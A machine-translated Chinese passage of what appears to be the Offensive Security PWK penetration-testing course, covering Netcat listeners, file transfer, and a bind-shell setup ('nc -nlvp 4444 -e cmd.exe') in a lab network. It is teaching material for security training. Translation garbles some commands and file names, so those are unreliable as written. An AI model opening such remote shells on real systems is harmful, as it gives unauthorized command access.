<div style="position:absolute;top:89856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 IP 地址为 10.11.0.22 的 Windows 机器上，我们设置 Netcat 以侦听</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传入</font></font></i></nobr></div>
<div style="position:absolute;top:89875;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 端口 4444 上的</font><i><font style="vertical-align: inherit;">连接</font></i><font style="vertical-align: inherit;">。我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项禁用 DNS 名称解析，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font></nobr></div>
<div style="position:absolute;top:89894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个监听器，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">增加一些详细信息，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定监听端口号：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:89946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:89966;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 79 - 使用 nc 设置侦听器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经将这台 Windows 机器上的端口 4444 绑定到 Netcat，让我们连接到该端口</font></font></nobr></div>
<div style="position:absolute;top:90014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的 Linux 机器上输入一行文本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:90066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 4444 (?) 打开</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:90083;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个聊天来自linux机器</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90102;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 80 - 使用 nc 连接到侦听器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的文本将通过 TCP 端口 4444 发送到 Windows 机器，我们可以继续“聊天”</font></font></nobr></div>
<div style="position:absolute;top:90151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Windows 机器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:90203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:90220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 &lt;UNKNOWN 连接到 [10.11.0.22]) [10.11.0.4] 43447</font></font></nobr></div>
<div style="position:absolute;top:90237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个聊天来自linux机器</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:90271;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此聊天来自 windows 机器</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90290;left:371"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 81 - 简单的 Netcat 聊天 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:90463;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="77"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 77 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:90496;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:91573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:91573;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:91573;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管这不是一个非常令人兴奋的示例，但它展示了 Netcat 中的几个重要功能。</font></font></nobr></div>
<div style="position:absolute;top:90611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前尝试回答这些重要问题：</font></font></nobr></div>
<div style="position:absolute;top:90644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:90644;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哪台机器充当 Netcat 服务器？</font></font></nobr></div>
<div style="position:absolute;top:90672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:90672;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哪台机器充当 Netcat 客户端？</font></font></nobr></div>
<div style="position:absolute;top:90701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:90701;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4444 端口是在哪台机器上打开的？</font></font></nobr></div>
<div style="position:absolute;top:90729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:90729;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端和服务器之间的命令行语法区别是什么？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:90763;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.3 使用 Netcat 传输文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat 还可用于将文件（文本和二进制文件）从一台计算机传输到另一台计算机。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:90821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事实上，取证调查人员经常将 Netcat 与</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（一种磁盘复制实用程序）</font><font style="vertical-align: inherit;">结合使用</font><font style="vertical-align: inherit;">来创建</font></font></nobr></div>
<div style="position:absolute;top:90840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过网络取证声音磁盘映像。</font></font></nobr></div>
<div style="position:absolute;top:90873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要将文件从我们的 Kali 虚拟机发送到 Windows 系统，我们启动了一个类似的设置</font></font></nobr></div>
<div style="position:absolute;top:90892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与之前的聊天示例，略有不同。</font><font style="vertical-align: inherit;">在 Windows 机器上，我们将设置</font></font></nobr></div>
<div style="position:absolute;top:90911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在端口 4444 上启动一个 Netcat 侦听器，并将任何输出重定向到一个名为coming.exe 的文件中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444 &gt;coming.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:90963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:90983;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 82 - 使用 nc 接收文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 系统上，我们将通过 TCP 端口 4444 将 wget.exe 文件推送到 Windows 机器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 wget.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:91064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/binaries/wget.exe</font></font></nobr></div>
<div style="position:absolute;top:91098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 4444 &lt; /usr/share/windows-resources/binaries/wget.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:91115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 4444 (?) 打开</font></font></nobr></div>
<div style="position:absolute;top:91134;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 83 - 使用 nc 传输文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows机器上的Netcat接收连接如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444 &gt;coming.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:91215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:91232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 &lt;UNKNOWN 连接到 [10.11.0.22]) [10.11.0.4] 43459</font></font></nobr></div>
<div style="position:absolute;top:91250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></nobr></div>
<div style="position:absolute;top:91267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:91286;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 84 - 在 Windows 上收到的连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们尚未收到 Netcat 关于我们文件上传进度的任何反馈。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:91334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">案例，由于我们上传的文件很小，我们可以等几秒钟，然后检查是否</font></font></nobr></div>
<div style="position:absolute;top:91354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过尝试运行该文件已完全上传到 Windows 计算机：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">incoming.exe -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:91406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GNU Wget 1.9.1，一个非交互式网络检索器。</font></font></nobr></div>
<div style="position:absolute;top:91423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：传入 [OPTION]... [URL]...</font></font></nobr></div>
<div style="position:absolute;top:91442;left:231"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 85 - 执行通过 nc 发送的文件。</font><font style="vertical-align: inherit;">-h 选项显示帮助菜单</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到，这实际上是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行文件，并且文件传输成功。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:91651;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="78"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 78 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:91684;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:92761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:92761;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:92761;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:91780;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.4 使用 Netcat 进行远程管理</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat 最有用的特性之一是它能够进行命令重定向。</font><font style="vertical-align: inherit;">网猫——</font></font></nobr></div>
<div style="position:absolute;top:91837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传统版本的 Netcat（使用“-DGAPING_SECURITY_HOLE”标志编译）启用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b></nobr></div>
<div style="position:absolute;top:91856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，它在建立或接收成功连接后执行程序。</font><font style="vertical-align: inherit;">这个强大的</font></font></nobr></div>
<div style="position:absolute;top:91876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能从安全角度开辟了各种有趣的可能性，因此</font></font></nobr></div>
<div style="position:absolute;top:91895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数现代 Linux/BSD 系统中不可用。</font><font style="vertical-align: inherit;">然而，由于 Kali Linux 是一个</font></font></nobr></div>
<div style="position:absolute;top:91915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试发行版，Kali 中包含的 Netcat 版本支持 -e 选项。</font></font></nobr></div>
<div style="position:absolute;top:91948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用后，此选项可以将可执行文件的输入、输出和错误消息重定向到</font></font></nobr></div>
<div style="position:absolute;top:91967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP/UDP 端口而不是默认控制台。</font></font></nobr></div>
<div style="position:absolute;top:92000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，考虑 cmd.exe 可执行文件。</font><font style="vertical-align: inherit;">通过将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stdin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stdout</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stderr</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向</font><font style="vertical-align: inherit;">到</font></font></nobr></div>
<div style="position:absolute;top:92019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络，我们可以将 cmd.exe 绑定到本地端口。</font><font style="vertical-align: inherit;">任何连接到此端口的人都会看到</font></font></nobr></div>
<div style="position:absolute;top:92038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标计算机上的命令提示符。</font></font></nobr></div>
<div style="position:absolute;top:92071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了澄清这一点，让我们再看一些涉及 Bob 和 Alice 的场景。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:92105;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.4.1 Netcat绑定Shell场景</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的第一个场景中，Bob（运行 Windows）请求 Alice 的帮助（谁正在运行</font></font></nobr></div>
<div style="position:absolute;top:92159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux）并要求她连接到他的计算机并远程发出一些命令。</font><font style="vertical-align: inherit;">鲍勃</font></font></nobr></div>
<div style="position:absolute;top:92179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有公网IP地址，直接连接互联网。</font><font style="vertical-align: inherit;">然而，Alice 支持 NATed</font></font></nobr></div>
<div style="position:absolute;top:92198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接，并具有内部 IP 地址。</font><font style="vertical-align: inherit;">为了完成这个场景，Bob 需要绑定 cmd.exe</font></font></nobr></div>
<div style="position:absolute;top:92217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到他公共 IP 地址上的 TCP 端口，并要求 Alice 连接到他的特定 IP 地址，然后</font></font></nobr></div>
<div style="position:absolute;top:92237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口。</font></font></nobr></div>
<div style="position:absolute;top:92270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bob 将检查他的本地 IP 地址，然后使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">运行 Netcat</font><font style="vertical-align: inherit;">以执行</font><font style="vertical-align: inherit;">一次</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:92289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到监听端口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:92341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:92358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器本地连接：</font></font></nobr></div>
<div style="position:absolute;top:92375;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:92392;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:92409;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.0.0</font></font></nobr></div>
<div style="position:absolute;top:92426;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.1</font></font></nobr></div>
<div style="position:absolute;top:92460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444 -e cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:92476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:92496;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 86 - 使用 nc 设置绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在 Netcat 已将 TCP 端口 4444 绑定到 cmd.exe 并将重定向任何输入、输出或错误</font></font></nobr></div>
<div style="position:absolute;top:92545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 cmd.exe 到网络的消息。</font><font style="vertical-align: inherit;">换句话说，任何人连接到 TCP 端口 4444</font></font></nobr></div>
<div style="position:absolute;top:92564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bob 的机器（希望是 Alice）将看到 Bob 的命令提示符。</font><font style="vertical-align: inherit;">这确实是一个</font></font></nobr></div>
<div style="position:absolute;top:92583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“大安全漏洞”！</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ip 地址显示 eth0 | </font><font style="vertical-align: inherit;">网路</font></font></font></b></nobr></div>
<div style="position:absolute;top:92635;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet 10.11.0.4/16 brd 10.11.255.255 范围全局动态 eth0</font></font></nobr></div>
<div style="position:absolute;top:92669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:92686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 4444 (?) 打开</font></font></nobr></div>
<div style="position:absolute;top:92703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590] </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:92839;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="79"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 79 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:92872;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:93949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:93949;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:93949;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">79</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:93018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:93036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:93052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器本地连接：</font></font></nobr></div>
<div style="position:absolute;top:93069;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
